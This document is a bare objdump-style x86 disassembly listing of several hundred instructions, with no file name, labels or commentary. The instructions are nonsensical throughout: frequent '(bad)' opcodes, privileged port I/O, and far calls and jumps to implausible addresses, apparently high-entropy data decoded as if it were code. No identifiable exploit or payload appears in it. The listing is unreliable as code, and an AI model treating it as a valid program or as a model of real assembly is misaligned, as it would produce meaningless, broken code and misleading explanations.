  41894c:	pop    esi
  41894d:	add    esi,eax
  41894f:	cmp    al,0x5e
  418951:	test   eax,0xf18e239d
  418956:	dec    esp
  418957:	stos   DWORD PTR es:[edi],eax
  418958:	push   ebp
  418959:	mov    esi,es
  41895b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41895c:	jg     0x41897c
  41895e:	mov    DWORD PTR ds:0x59071f0d,edx
  418964:	mov    edx,0x8a0d5e2f
  418969:	pop    esp
  41896a:	mov    eax,ds:0x668021cf
  41896f:	xchg   ebx,eax
  418970:	and    ah,BYTE PTR ds:0x89204d49
  418976:	cmc    
  418977:	pusha  
  418978:	in     al,0x20
  41897a:	push   ss
  41897b:	pop    edx
  41897c:	inc    edi
  41897d:	je     0x4189ec
  41897f:	or     eax,0x67a4b6c3
  418984:	jb     0x41890a
  418986:	xchg   ecx,eax
  418987:	pop    ecx
  418988:	cld    
  418989:	jbe    0x4189b0
  41898b:	adc    DWORD PTR [eax+0x1eb5d342],ecx
  418991:	inc    edi
  418992:	sbb    DWORD PTR [ebx],edx
  418994:	rcr    BYTE PTR [ebp-0x27],cl
  418997:	ror    BYTE PTR ds:0x7939fd07,1
  41899d:	pop    ecx
  41899e:	loop   0x4189ea
  4189a0:	mov    cs,WORD PTR [esi+0x0]
  4189a3:	js     0x418a1f
  4189a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189a6:	out    dx,eax
  4189a7:	cmp    ebx,DWORD PTR ds:0x5b0f6d6c
  4189ad:	add    al,0x85
  4189af:	inc    esp
  4189b0:	push   cs
  4189b1:	sbb    al,0xd4
  4189b3:	xor    BYTE PTR [edx],bh
  4189b5:	pop    ebp
  4189b6:	mov    esp,0xcc569758
  4189bb:	xor    eax,0x34716acb
  4189c0:	xor    ah,BYTE PTR [ecx+edi*4]
  4189c3:	pusha  
  4189c4:	mov    cl,0x1c
  4189c6:	xor    al,0x9e
  4189c8:	jle    0x418963
  4189ca:	das    
  4189cb:	push   es
  4189cc:	jp     0x418a30
  4189ce:	je     0x4189bc
  4189d0:	push   es
  4189d1:	lods   al,BYTE PTR ds:[esi]
  4189d2:	inc    eax
  4189d3:	mov    dh,BYTE PTR [edi-0x23]
  4189d6:	scas   al,BYTE PTR es:[edi]
  4189d7:	mov    al,0x81
  4189d9:	cmp    al,0xe5
  4189db:	arpl   WORD PTR [edx-0x6],bx
  4189de:	fnstcw WORD PTR [esi-0x2c63345c]
  4189e4:	ds leave 
  4189e6:	mov    al,ds:0x8e3fe4de
  4189eb:	mov    bh,0x87
  4189ed:	push   0xffffffdc
  4189ef:	xchg   ecx,eax
  4189f0:	scas   eax,DWORD PTR es:[edi]
  4189f1:	or     eax,ebx
  4189f3:	sbb    bl,dl
  4189f5:	je     0x418a22
  4189f7:	jo     0x41899d
  4189f9:	pusha  
  4189fa:	lods   al,BYTE PTR ds:[esi]
  4189fb:	sub    al,0x37
  4189fd:	dec    ebx
  4189fe:	repnz dec edi
  418a00:	ss mov dh,0x6a
  418a03:	sbb    DWORD PTR [ebx+0x66],edi
  418a06:	pop    eax
  418a07:	arpl   WORD PTR [ecx],si
  418a09:	xor    eax,0x814aa5ec
  418a0e:	out    0x57,al
  418a10:	jp     0x418a13
  418a12:	dec    ebx
  418a13:	cmp    eax,esp
  418a15:	xor    eax,0xffffffd3
  418a18:	stos   BYTE PTR es:[edi],al
  418a19:	aaa    
  418a1a:	repnz repz cmp DWORD PTR [bp+si],edx
  418a1f:	mov    esp,ecx
  418a21:	pop    esi
  418a22:	xlat   BYTE PTR ds:[ebx]
  418a23:	inc    edx
  418a24:	xchg   edi,eax
  418a25:	mov    al,0xb6
  418a27:	loopne 0x418a8c
  418a29:	mov    ebp,0xe3a94bce
  418a2e:	lock xchg edx,eax
  418a30:	or     BYTE PTR [eax+0x39cd330f],al
  418a36:	(bad)  
  418a37:	stc    
  418a38:	inc    esi
  418a39:	sub    al,0x5e
  418a3b:	cli    
  418a3c:	test   eax,0x1411c615
  418a41:	aam    0x64
  418a43:	cvtdq2ps xmm7,xmm0
  418a46:	pop    ecx
  418a47:	in     al,dx
  418a48:	or     DWORD PTR [esi],eax
  418a4a:	push   es
  418a4b:	jg     0x418a63
  418a4d:	aad    0x5d
  418a4f:	call   0xdc46:0xac45526e
  418a56:	out    dx,eax
  418a57:	fst    DWORD PTR [ecx+0x4]
  418a5a:	call   0x4f50:0x887ec2ad
  418a61:	add    bh,BYTE PTR [edi+0x65]
  418a64:	dec    esp
  418a65:	popf   
  418a66:	add    DWORD PTR [eax-0x7ef071a3],0xffffffc1
  418a6d:	add    esi,DWORD PTR [esi+0x64]
  418a70:	dec    eax
  418a71:	cmc    
  418a72:	add    eax,0xd8b6f966
  418a77:	outs   dx,DWORD PTR ds:[esi]
  418a78:	ja     0x418a8e
  418a7a:	xchg   edx,eax
  418a7b:	pop    ecx
  418a7c:	(bad)  
  418a7d:	bnd jns 0x418aab
  418a80:	aas    
  418a81:	push   edi
  418a82:	imul   esp,DWORD PTR [ebx],0xffffff80
  418a85:	or     DWORD PTR [ebx+0x3f],esp
  418a88:	push   ss
  418a89:	mov    DWORD PTR [ebx],0x6ebd868
  418a8f:	fsubr  st(2),st
  418a91:	mov    ds:0x44bf234c,al
  418a96:	out    dx,eax
  418a97:	mov    al,0xca
  418a99:	add    al,0x2e
  418a9b:	aas    
  418a9c:	xor    cl,BYTE PTR [edx-0x1d]
  418a9f:	frstor [eax]
  418aa1:	in     eax,0xda
  418aa3:	xchg   BYTE PTR [edx],ah
  418aa5:	jns    0x418a61
  418aa7:	xlat   BYTE PTR ds:[ebx]
  418aa8:	xchg   ebp,eax
  418aa9:	shl    bl,1
  418aab:	xor    eax,0xe327c1a8
  418ab0:	jnp    0x418adb
  418ab2:	in     al,dx
  418ab3:	or     ch,ah
  418ab5:	sbb    BYTE PTR [esi-0x4b],ch
  418ab8:	xchg   ecx,eax
  418ab9:	inc    ebx
  418aba:	outs   dx,DWORD PTR ds:[esi]
  418abb:	inc    ecx
  418abc:	mov    ?,WORD PTR [ebx+0x22]
  418abf:	or     DWORD PTR [edx],ebp
  418ac1:	cmp    BYTE PTR [eax-0x2db5124],dh
  418ac7:	fmul   DWORD PTR [eax+eax*4-0x3a]
  418acb:	add    BYTE PTR [edi],bh
  418acd:	mov    al,0xb2
  418acf:	mov    BYTE PTR [ebx],dl
  418ad1:	jg     0x418ac1
  418ad3:	xchg   esp,eax
  418ad4:	mov    edi,0xd8f81403
  418ad9:	ret    0xeaaa
  418adc:	or     ah,cl
  418ade:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418adf:	cli    
  418ae0:	sub    BYTE PTR [eax],cl
  418ae2:	das    
  418ae3:	push   0xe2e3bee1
  418ae8:	add    al,BYTE PTR [ebx-0x5e]
  418aeb:	ja     0x418b05
  418aed:	pop    es
  418aee:	lahf   
  418aef:	div    BYTE PTR [edx]
  418af1:	sbb    BYTE PTR [edx+0x1b],bh
  418af4:	out    0xb0,eax
  418af6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418af7:	sbb    edx,DWORD PTR [edi+0x6fea1d38]
  418afd:	jo     0x418b7d
  418aff:	repnz sbb esp,esi
  418b02:	lods   eax,DWORD PTR ds:[esi]
  418b03:	dec    edi
  418b04:	fidivr WORD PTR [ebx]
  418b06:	lahf   
  418b07:	lods   al,BYTE PTR ds:[esi]
  418b08:	pop    es
  418b09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b0a:	sti    
  418b0b:	xlat   BYTE PTR ds:[ebx]
  418b0c:	imul   esp,edi,0x1b
  418b0f:	dec    esp
  418b10:	aad    0x6c
  418b12:	sahf   
  418b13:	mov    esp,0x49b570ab
  418b18:	out    dx,eax
  418b19:	rcl    dl,0xdc
  418b1c:	fld    DWORD PTR [edi]
  418b1e:	mov    dl,0x94
  418b20:	ins    BYTE PTR es:[edi],dx
  418b21:	xor    BYTE PTR ds:0x93b0317a,ah
  418b27:	lods   eax,DWORD PTR ds:[esi]
  418b28:	fsubr  st,st(3)
  418b2a:	cmp    BYTE PTR [ecx],0x5a
  418b2d:	adc    ch,BYTE PTR [esi-0x30ef3dba]
  418b33:	mov    edx,0x27b02f43
  418b38:	es mov ah,0x4b
  418b3b:	mov    ebx,0x98dd29ae
  418b40:	out    0x60,eax
  418b42:	xchg   ecx,eax
  418b43:	mov    ch,0x73
  418b45:	xlat   BYTE PTR ds:[ebx]
  418b46:	lahf   
  418b47:	cmp    DWORD PTR gs:[edi],eax
  418b4a:	fnstenv [ebx+0x62]
  418b4d:	push   ecx
  418b4e:	and    edx,DWORD PTR [ebx-0x4a0a6b31]
  418b54:	imul   ebx,DWORD PTR [edx+0x3bcd6b3f],0x535403e2
  418b5e:	mov    WORD PTR [ecx],?
  418b60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b61:	xor    BYTE PTR [eax-0x3c7f7ab8],ah
  418b67:	sbb    ecx,DWORD PTR ds:0xedf82562
  418b6d:	add    esp,DWORD PTR [edx-0x451265cc]
  418b73:	lock out 0x16,al
  418b76:	pop    esi
  418b77:	(bad)  
  418b79:	jl     0x418b2a
  418b7b:	cmp    DWORD PTR [ecx],eax
  418b7d:	fdiv   st(6),st
  418b7f:	jle    0x418bdd
  418b81:	pop    ss
  418b82:	in     al,0x24
  418b84:	xchg   BYTE PTR [edi],dl
  418b86:	jge    0x418b1e
  418b88:	mov    ah,0xb6
  418b8a:	inc    ebp
  418b8b:	in     eax,dx
  418b8c:	mov    dl,0x56
  418b8e:	(bad)  
  418b8f:	and    al,0x1d
  418b91:	mov    ah,0xfb
  418b93:	add    eax,DWORD PTR [esi+0x23f9298]
  418b99:	dec    eax
  418b9a:	call   0x129b:0x99167bfa
  418ba1:	shr    DWORD PTR [eax+0x158772fc],1
  418ba7:	and    al,0x20
  418ba9:	push   0xfffffff4
  418bab:	(bad)  
  418bac:	fdiv   st(7),st
  418bae:	in     eax,0xb6
  418bb0:	aaa    
  418bb1:	sahf   
  418bb2:	push   esi
  418bb3:	sbb    BYTE PTR ds:0x387eab79,ah
  418bb9:	(bad)  
  418bba:	mov    WORD PTR [ebx-0x4],ss
  418bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bbe:	jbe    0x418c3a
  418bc0:	pop    es
  418bc1:	in     eax,dx
  418bc2:	or     ebp,eax
  418bc4:	sar    DWORD PTR [ebx+0x40acedf9],1
  418bca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bcb:	mov    ebx,DWORD PTR [eax-0x6]
  418bce:	outs   dx,DWORD PTR ds:[esi]
  418bcf:	in     al,dx
  418bd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bd1:	xchg   esp,eax
  418bd2:	fld    TBYTE PTR [esi+0x24f842e6]
  418bd8:	xor    ch,bl
  418bda:	sub    BYTE PTR [eax+0xe3b7fdc],bh
  418be0:	out    0x89,eax
  418be2:	fild   WORD PTR [ebp-0xb]
  418be5:	mov    ?,WORD PTR [edx+0x471115cf]
  418beb:	xchg   esi,eax
  418bed:	iret   
  418bee:	cli    
  418bef:	jmp    0xa1c32e0
  418bf4:	in     eax,dx
  418bf5:	mov    ch,al
  418bf7:	adc    BYTE PTR [ebx+0x5e],0x38
  418bfb:	dec    ecx
  418bfc:	je     0x418b97
  418bfe:	cmp    BYTE PTR ds:0xd2f21087,ah
  418c04:	cmp    esi,DWORD PTR [esi]
  418c06:	pop    ebp
  418c07:	cmp    DWORD PTR [ebp-0x3b447809],esi
  418c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c0e:	add    DWORD PTR [eax+0x31b8bc6b],edx
  418c14:	call   0x7136:0x902b918
  418c1b:	cs dec eax
  418c1d:	mov    esi,0x223ae69c
  418c22:	dec    edx
  418c23:	(bad)  
  418c24:	cmp    al,0x13
  418c26:	lock aad 0xf6
  418c29:	(bad)  ds:0x9ea97b8d
  418c2f:	xlat   BYTE PTR ds:[ebx]
  418c30:	adc    eax,0x2a872220
  418c35:	mov    cl,0xf8
  418c37:	into   
  418c38:	mov    eax,ds:0x5176f45d
  418c3d:	lahf   
  418c3e:	jmp    0x418c7d
  418c40:	mov    ebp,0x372d0219
  418c45:	add    esi,DWORD PTR [edi+0x4bcbf4c1]
  418c4b:	mov    eax,ds:0x7b6cab42
  418c50:	rcl    DWORD PTR [ecx+0x21fdd328],0x96
  418c57:	mov    cl,0xbd
  418c59:	push   es
  418c5a:	adc    al,0xe9
  418c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c5d:	loope  0x418c21
  418c5f:	sub    al,0xa1
  418c61:	xchg   ecx,eax
  418c62:	out    dx,eax
  418c63:	jae    0x418cd9
  418c65:	push   ss
  418c66:	pop    eax
  418c67:	pop    ebx
  418c68:	cmp    al,BYTE PTR [edx]
  418c6a:	jno    0x418c0a
  418c6c:	sbb    al,0xf5
  418c6e:	ficom  WORD PTR [edi]
  418c70:	mov    BYTE PTR [ebx+0x5e],dh
  418c73:	ret    0x4107
  418c76:	sub    esp,esi
  418c78:	or     BYTE PTR [edi],0x6f
  418c7b:	iret   
  418c7c:	bound  ecx,QWORD PTR [edx+0x35]
  418c7f:	dec    edi
  418c80:	mov    WORD PTR [ebx-0x4],cs
  418c83:	ret    0x977
  418c86:	out    dx,al
  418c87:	inc    esi
  418c88:	enter  0x86b9,0x24
  418c8c:	popf   
  418c8d:	xchg   esi,eax
  418c8e:	sub    bh,BYTE PTR [ecx+0x358d0ae6]
  418c94:	imul   esp,DWORD PTR ds:0x7f21d7c9,0xffffffb1
  418c9b:	hlt    
  418c9c:	into   
  418c9d:	test   BYTE PTR [esp+eiz*2],0x25
  418ca1:	xchg   ebp,eax
  418ca2:	pusha  
  418ca3:	scas   eax,DWORD PTR es:[edi]
  418ca4:	adc    BYTE PTR [edx-0x74],ch
  418ca7:	adc    DWORD PTR [ecx-0x3683dc7b],eax
  418cad:	or     eax,0x2ab82832
  418cb2:	out    0x1d,eax
  418cb4:	pop    ecx
  418cb5:	and    DWORD PTR ss:[ecx],0xffffffb6
  418cb9:	in     al,0xb6
  418cbb:	outs   dx,BYTE PTR ds:[esi]
  418cbc:	bnd jae 0x418c51
  418cbf:	pop    ds
  418cc0:	and    ch,dh
  418cc2:	adc    edi,edi
  418cc4:	ja     0x418c9b
  418cc6:	jno    0x418cdf
  418cc8:	aam    0x78
  418cca:	xchg   DWORD PTR [ecx-0x1bd61b9c],edx
  418cd0:	sub    ebp,eax
  418cd2:	push   ds
  418cd3:	pop    ds
  418cd4:	nop
  418cd5:	jl     0x418c5b
  418cd7:	add    eax,0x6580c8f5
  418cdc:	fisub  WORD PTR [edi+0x14f08353]
  418ce2:	push   eax
  418ce3:	and    DWORD PTR [eax+0x560d846a],edi
  418ce9:	inc    edx
  418cea:	push   ebx
  418ceb:	mov    bl,0xdf
  418ced:	(bad)  
  418cee:	pop    ebp
  418cef:	jmp    0x418c81
  418cf1:	fcom   DWORD PTR [eax]
  418cf3:	and    DWORD PTR [esi+eiz*1],ecx
  418cf6:	sub    BYTE PTR [eax],0xa2
  418cf9:	pop    esp
  418cfa:	cmp    DWORD PTR [edx+0x6cd68c02],eax
  418d00:	push   0x7d60bf15
  418d05:	or     ecx,DWORD PTR ds:[bp+0x63]
  418d0a:	add    BYTE PTR [esi+ebp*1+0x60],bl
  418d0e:	mov    ebx,0x3bc98656
  418d13:	mov    eax,ds:0xf5cec31a
  418d18:	sub    DWORD PTR [edi-0x4f],eax
  418d1b:	add    al,al
  418d1d:	pushf  
  418d1e:	xchg   DWORD PTR [ebx+0x391b70e3],eax
  418d24:	xchg   edx,eax
  418d25:	mov    ebp,0x43847e9d
  418d2a:	mov    ds:0xac7b6bee,al
  418d2f:	pushf  
  418d30:	or     eax,0x52165283
  418d35:	push   0x17
  418d37:	add    eax,0xe915df9
  418d3c:	push   ebp
  418d3d:	(bad)  
  418d3e:	repnz dec edi
  418d40:	hlt    
  418d41:	mov    al,0x72
  418d43:	mov    ah,0x37
  418d45:	shl    DWORD PTR [esi],0x47
  418d48:	call   0x9141:0x6208c2f7
  418d4f:	jae    0x418da5
  418d51:	ins    BYTE PTR es:[edi],dx
  418d52:	xor    eax,0xe61569a7
  418d57:	push   ss
  418d58:	call   0x2315:0xeb5766e3
  418d5f:	lods   al,BYTE PTR ds:[esi]
  418d60:	ja     0x418d8c
  418d62:	pop    ecx
  418d63:	add    ecx,DWORD PTR [edi+0x19]
  418d66:	sahf   
  418d67:	jae    0x418d68
  418d69:	or     eax,0xe3288f0
  418d6e:	stc    
  418d6f:	pop    ebx
  418d70:	cmp    BYTE PTR [ebx-0x38],bl
  418d73:	adc    ebx,DWORD PTR [ebp+esi*4-0x61]
  418d77:	pop    eax
  418d78:	dec    esp
  418d79:	dec    ebp
  418d7a:	inc    esi
  418d7b:	cli    
  418d7c:	xor    dl,bl
  418d7e:	xchg   ebp,eax
  418d7f:	xchg   esi,eax
  418d80:	xor    dh,cl
  418d82:	adc    eax,ecx
  418d84:	fbld   TBYTE PTR [ebx]
  418d86:	mov    BYTE PTR [edx-0x1b],bh
  418d89:	outs   dx,DWORD PTR ds:[esi]
  418d8a:	xor    al,0xf2
  418d8c:	sbb    DWORD PTR [edx*4-0x13dd7cc6],edx
  418d93:	repz xchg ebx,eax
  418d95:	push   eax
  418d96:	jmp    0x418dc8
  418d98:	add    ebx,edi
  418d9a:	iret   
  418d9b:	lods   eax,DWORD PTR fs:[esi]
  418d9d:	(bad)  
  418d9e:	test   al,0x96
  418da0:	cli    
  418da1:	es pop edi
  418da3:	mov    BYTE PTR ds:0xe915ff8e,bl
  418da9:	retf   0xb2e6
  418dac:	fistp  DWORD PTR cs:[esi]
  418daf:	lds    esi,FWORD PTR [edx-0x255fdcb8]
  418db5:	ror    DWORD PTR [edx+0x11170278],0x42
  418dbc:	fprem  
  418dbe:	lods   al,BYTE PTR ds:[esi]
  418dbf:	test   BYTE PTR [ebx-0x14d7ddf5],ah
  418dc5:	mov    WORD PTR [esi+0x3a],fs
  418dc8:	lods   eax,DWORD PTR ds:[esi]
  418dc9:	and    al,BYTE PTR ds:0x69c79cb6
  418dcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dd0:	jb     0x418d95
  418dd2:	dec    ebx
  418dd3:	push   ecx
  418dd4:	push   ebp
  418dd5:	mov    fs,WORD PTR [edi+0x4f]
  418dd8:	mov    dl,al
  418dda:	adc    dh,BYTE PTR [esp+eax*8-0x2c545b84]
  418de1:	xchg   BYTE PTR [ecx+0x64],ch
  418de4:	jno    0x418db2
  418de6:	jecxz  0x418dbe
  418de8:	enter  0xab85,0x8a
  418dec:	cdq    
  418ded:	mov    ah,0xed
  418def:	xlat   BYTE PTR ds:[ebx]
  418df0:	fmul   DWORD PTR [ecx+0x73]
  418df3:	ss in  al,dx
  418df5:	push   ebp
  418df6:	mov    ch,0x83
  418df8:	ja     0x418e37
  418dfa:	add    ah,al
  418dfc:	jle    0x418e41
  418dfe:	and    esp,0xffffff9c
  418e01:	inc    esi
  418e02:	es js  0x418e1e
  418e05:	dec    edx
  418e06:	adc    bl,cl
  418e08:	dec    eax
  418e09:	xchg   ecx,eax
  418e0a:	jl     0x418e3c
  418e0c:	or     al,0x96
  418e0e:	ins    BYTE PTR es:[edi],dx
  418e0f:	push   edi
  418e10:	scas   eax,DWORD PTR es:[edi]
  418e11:	xor    dl,0x2f
  418e14:	das    
  418e15:	inc    edx
  418e16:	shl    BYTE PTR [ebp+0x67061f26],0xcf
  418e1d:	fwait
  418e1e:	rcl    BYTE PTR [eax-0x60092b97],0x5d
  418e25:	pop    ds
  418e26:	retf   
  418e27:	imul   ebp,DWORD PTR [ebx],0x4883705f
  418e2d:	hlt    
  418e2e:	rol    BYTE PTR [edx],0xc9
  418e31:	adc    al,0x7
  418e33:	sbb    BYTE PTR [ebx],dl
  418e35:	mov    ds:0x3d19c135,eax
  418e3a:	arpl   WORD PTR [edx],cx
  418e3c:	xchg   ecx,eax
  418e3d:	fbld   TBYTE PTR ds:0x5b29e638
  418e43:	cmp    al,0x75
  418e45:	cmp    BYTE PTR [edi-0x37],al
  418e48:	shl    DWORD PTR [ebp+0x77],0x8f
  418e4c:	add    dh,bl
  418e4e:	in     al,0xac
  418e50:	mov    BYTE PTR [ebx+0x719bd82e],bh
  418e56:	and    dl,BYTE PTR ss:[ebx]
  418e59:	test   eax,0x35e0bf6b
  418e5e:	int    0xc6
  418e60:	sub    DWORD PTR [ecx],eax
  418e62:	inc    edi
  418e63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e64:	aam    0x9e
  418e66:	das    
  418e67:	clc    
  418e68:	adc    BYTE PTR [edx-0x31],bh
  418e6b:	pop    esi
  418e6c:	or     ch,ch
  418e6e:	bound  ecx,QWORD PTR [edx]
  418e70:	and    esp,ebx
  418e72:	test   DWORD PTR ds:0xece1e697,ebp
  418e78:	std    
  418e79:	inc    edi
  418e7a:	and    edx,DWORD PTR [ebx-0x5f3c5893]
  418e80:	dec    eax
  418e81:	add    DWORD PTR [esi-0x553efb91],0xffffffe6
  418e88:	push   esp
  418e89:	add    al,0xad
  418e8b:	jmp    0x1008644
  418e90:	sub    dl,bl
  418e92:	sub    al,0x27
  418e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e95:	retf   
  418e96:	cmp    DWORD PTR [eax+0x12cb6bcd],ecx
  418e9c:	ins    BYTE PTR es:[edi],dx
  418e9d:	fisttp DWORD PTR [edx]
  418e9f:	dec    edx
  418ea0:	mul    BYTE PTR [esi+ecx*2+0x39]
  418ea4:	mov    eax,0xea846227
  418ea9:	dec    ebx
  418eaa:	outs   dx,DWORD PTR ds:[esi]
  418eab:	or     ebx,DWORD PTR [eax]
  418ead:	call   0x1fe9:0x6bb20339
  418eb4:	shl    BYTE PTR [esi-0x3e],cl
  418eb7:	test   BYTE PTR [ebx+0x30],al
  418eba:	sahf   
  418ebb:	js     0x418f3a
  418ebd:	fidiv  WORD PTR [edi+0x48]
  418ec0:	or     DWORD PTR [edx+0x70e4147f],ecx
  418ec6:	or     dh,BYTE PTR ds:0xc1c050fc
  418ecc:	xchg   edx,eax
  418ecd:	xchg   ebp,eax
  418ece:	add    DWORD PTR [eax-0x5e],ebp
  418ed1:	pop    eax
  418ed2:	jne    0x418e76
  418ed4:	add    BYTE PTR [eax+0x7e92bc55],dl
  418eda:	call   0x651baf4b
  418edf:	cld    
  418ee0:	mov    cl,0xe2
  418ee2:	out    0xda,al
  418ee4:	xchg   edi,eax
  418ee5:	pop    ecx
  418ee6:	sbb    eax,0xa61d5d05
  418eeb:	and    eax,0x546b5f1b
  418ef0:	sti    
  418ef1:	ret    0x9c54
  418ef4:	mov    dh,0xb6
  418ef6:	xor    eax,0xd654c1b0
  418efb:	loopne 0x418f4f
  418efd:	mov    esp,0x3f41da89
  418f02:	pushf  
  418f03:	into   
  418f04:	cmp    DWORD PTR [edi],edi
  418f06:	add    eax,0x136470a4
  418f0b:	fwait
  418f0c:	jmp    0x3ab8:0x5943570a
  418f13:	pop    ebp
  418f14:	xor    BYTE PTR [edx-0x62],cl
  418f17:	xor    ah,BYTE PTR [ebp-0x33]
  418f1a:	mov    al,ds:0x30fd470a
  418f1f:	sub    al,0x3d
  418f21:	inc    edx
  418f22:	ret    
  418f23:	jbe    0x418f4d
  418f25:	xor    DWORD PTR [edx+esi*4+0x51],ebx
  418f29:	jecxz  0x418f7d
  418f2b:	and    BYTE PTR [ebp+edx*1-0x8fd99eb],0x27
  418f33:	enter  0xd844,0xe4
  418f37:	stc    
  418f38:	(bad)  
  418f39:	jo     0x418ed2
  418f3b:	scas   eax,DWORD PTR es:[edi]
  418f3c:	scas   al,BYTE PTR es:[edi]
  418f3d:	mov    bh,0x98
  418f3f:	cmp    BYTE PTR [eax-0x69],dl
  418f42:	mov    dh,0x8e
  418f44:	test   al,0x39
  418f46:	adc    al,0xa4
  418f48:	stos   BYTE PTR es:[edi],al
  418f49:	sahf   
  418f4a:	hlt    
  418f4b:	inc    edi
  418f4c:	loop   0x418f36
  418f4e:	call   0x91337e0b
  418f53:	out    0xab,eax
  418f55:	ja     0x418fb4
  418f57:	add    edi,0xffffffb6
  418f5a:	jle    0x418ee3
  418f5c:	pop    ebp
  418f5d:	pop    ebp
  418f5e:	outs   dx,DWORD PTR ds:[esi]
  418f5f:	fist   DWORD PTR [ebp+0x6b9d74fe]
  418f65:	lds    edi,FWORD PTR [edi+ebx*1-0x4b]
  418f69:	mov    ecx,0xd69f86c
  418f6e:	cmp    DWORD PTR [esi+0x3d],edx
  418f71:	cmp    BYTE PTR [eax+0x53dd31f4],cl
  418f77:	mov    edi,fs
  418f79:	and    bh,dh
  418f7b:	leave  
  418f7c:	add    edi,ebp
  418f7e:	push   edx
  418f7f:	scas   al,BYTE PTR es:[edi]
  418f80:	ret    0x8a38
  418f83:	inc    ebx
  418f84:	stos   DWORD PTR es:[edi],eax
  418f85:	in     eax,0x3e
  418f87:	sar    BYTE PTR [ecx-0x5960d42],0x6f
  418f8e:	xchg   ebx,eax
  418f8f:	xchg   edi,eax
  418f90:	enter  0xb36a,0x1f
  418f94:	sbb    ebp,ebp
  418f96:	(bad)  
  418f97:	ss sahf 
  418f99:	and    eax,0xe4f2d22f
  418f9e:	in     al,0xc3
  418fa0:	jns    0x419004
  418fa2:	xchg   bl,cl
  418fa4:	pop    ecx
  418fa5:	js     0x418f6f
  418fa7:	int    0xf4
  418fa9:	lea    ebx,[edx-0x3f996f8a]
  418faf:	xor    edx,DWORD PTR [edi-0x7c]
  418fb2:	into   
  418fb3:	popa   
  418fb4:	mov    bh,BYTE PTR [esi+0x24]
  418fb7:	mov    al,ds:0x738d998b
  418fbc:	push   ebp
  418fbd:	cmp    al,0x16
  418fbf:	xchg   DWORD PTR [ebp-0xd92e49a],eax
  418fc5:	add    eax,0x4acdb9c0
  418fca:	pushf  
  418fcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fcc:	inc    esp
  418fcd:	fwait
  418fce:	std    
  418fcf:	and    BYTE PTR [edx],bh
  418fd1:	push   ds
  418fd2:	sbb    edi,edx
  418fd4:	and    eax,0x20ea5ad3
  418fd9:	pop    eax
  418fda:	push   ebp
  418fdb:	scas   eax,DWORD PTR es:[edi]
  418fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fdd:	jbe    0x419036
  418fdf:	push   cs
  418fe0:	jns    0x418f71
  418fe2:	mov    cl,0xf2
  418fe4:	adc    DWORD PTR [edx+edx*1],0x887ef1e5
  418feb:	push   ds
  418fec:	stc    
  418fed:	and    al,0xdd
  418fef:	or     eax,0x393fd6ab
  418ff4:	sahf   
  418ff5:	cld    
  418ff6:	mov    bl,0x76
  418ff8:	test   DWORD PTR [eax+0x16eacc5f],ebp
  418ffe:	pop    ebp
  418fff:	repz hlt 
  419001:	mov    bh,BYTE PTR [edx+ebp*8-0x281e007f]
  419008:	jecxz  0x419061
  41900a:	ror    DWORD PTR [ebx],1
  41900c:	mov    al,ds:0xae4d9697
  419011:	push   esi
  419012:	imul   eax
  419014:	(bad)  [edx+0x5b]
  419017:	je     0x418fd0
  419019:	mov    al,0xf3
  41901b:	ret    0xf4fb
  41901e:	call   DWORD PTR [ecx+0x2a4090d5]
  419024:	sbb    DWORD PTR [eax-0x71],edi
  419027:	loop   0x418fb8
  419029:	arpl   di,bx
  41902b:	imul   ebp,DWORD PTR ds:0xa57f9777,0x4d88b69
  419035:	in     eax,dx
  419036:	mov    ah,0x5e
  419038:	or     DWORD PTR [eax],ebx
  41903a:	popf   
  41903b:	cmp    dl,dl
  41903d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41903e:	je     0x419004
  419040:	xchg   BYTE PTR [eax-0x1e],al
  419043:	ffree  st(2)
  419045:	in     al,0x4a
  419047:	mov    ds:0xf96f44bd,al
  41904c:	pop    ebp
  41904d:	gs mov ebp,0x6d284308
  419053:	or     DWORD PTR [esi],edx
  419055:	jb     0x419085
  419057:	or     BYTE PTR [ecx],bh
  419059:	retf   
  41905a:	lods   eax,DWORD PTR ds:[esi]
  41905b:	dec    ebx
  41905c:	or     bl,dl
  41905e:	popa   
  41905f:	inc    esp
  419060:	arpl   si,si
  419062:	xchg   ebx,eax
  419063:	and    al,0xdc
  419066:	xchg   ebp,eax
  419067:	add    eax,0x4306cba1
  41906c:	call   0x100:0xfbcf681a
  419073:	in     al,dx
  419074:	in     al,0x20
  419076:	adc    DWORD PTR [edx],0x10
  419079:	pop    esp
  41907a:	dec    ebp
  41907b:	sub    DWORD PTR [esi+0x30],0xfffffff7
  41907f:	call   0xc52ea7a
  419084:	push   ss
  419085:	pop    ds
  419086:	call   0xf4:0x5d80
  41908c:	jb     0x419083
  41908e:	push   0x34343767
  419093:	fiadd  DWORD PTR [ecx]
  419095:	add    eax,DWORD PTR [ebx]
  419097:	jp     0x4190a0
  419099:	enter  0x1ae8,0xfa
  41909d:	mov    esp,0x5c983bda
  4190a2:	test   eax,0xf128e559
  4190a7:	imul   eax,DWORD PTR [edi+0x21],0xf0a677f0
  4190ae:	fidivr WORD PTR [edi+eiz*2]
  4190b1:	jo     0x4190f9
  4190b3:	test   DWORD PTR [edi+0x4b],esi
  4190b6:	sahf   
  4190b7:	dec    edx
  4190b8:	lds    ebp,FWORD PTR [eax-0x12]
  4190bb:	sbb    al,0x33
  4190bd:	int3   
  4190be:	jle    0x4190df
  4190c0:	xor    edx,0xa891167b
  4190c6:	sub    DWORD PTR [ecx],0x14
  4190c9:	cld    
  4190ca:	jbe    0x41909a
